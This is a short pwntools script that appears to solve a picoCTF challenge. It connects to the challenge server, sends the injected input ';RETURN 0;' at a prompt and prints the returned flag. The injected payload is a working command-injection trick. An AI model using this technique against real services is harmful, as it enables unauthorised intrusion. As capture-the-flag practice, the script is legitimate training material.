from pwn import *

io = remote("verbal-sleep.picoctf.net", 63147)
#context.log_level = 'debug'

payload = b";RETURN 0;"

log.info("Sending payload")
io.sendlineafter(b"Crowd: ", payload)
log.info("Waiting for flag")
io.recvuntil(b"conquer, ")
flag = io.recvline().decode().strip()

log.success(flag)
io.close()
